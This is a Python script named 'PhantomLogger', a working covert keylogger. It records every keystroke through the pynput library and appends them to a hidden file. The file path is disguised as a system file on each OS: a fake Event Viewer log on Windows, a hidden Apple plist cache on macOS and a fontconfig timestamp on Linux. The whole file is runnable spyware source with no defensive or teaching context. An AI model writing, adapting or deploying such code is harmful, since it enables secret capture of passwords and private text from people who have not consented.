from pynput.keyboard import Key, Listener
import platform
import os


class PhantomLogger:
    def __init__(self):
        self.log_file = self._get_log_path()
    
    def _get_log_path(self):
        system = platform.system()
        
        if system == "Windows":
            return os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Event Viewer', 'ExternalLogs.dat')
            
        elif system == "Darwin":
            return os.path.expanduser('~/Library/Caches/.com.apple.bird.plist')
            
        elif system == "Linux":
            return os.path.expanduser('~/.cache/.fontconfig-timestamp.dat')
    
    def _write_file(self, key_data):
        with open(self.log_file, 'a') as f:
            f.write(f"{key_data} ")
    
    def on_press(self, key):
        try:
            # Handle alphanumeric keys
            key_data = key.char
        except AttributeError:
            # Handle special keys (e.g., Key.space, Key.enter)
            key_data = str(key).replace("Key.", "")
            
        self._write_file(key_data)
    
    def phantom_logger_manager(self):
        log_dir = os.path.dirname(self.log_file)
        if log_dir and not os.path.exists(log_dir):
            os.makedirs(log_dir, exist_ok=True)

        with Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    logger = PhantomLogger()
    logger.phantom_logger_manager()
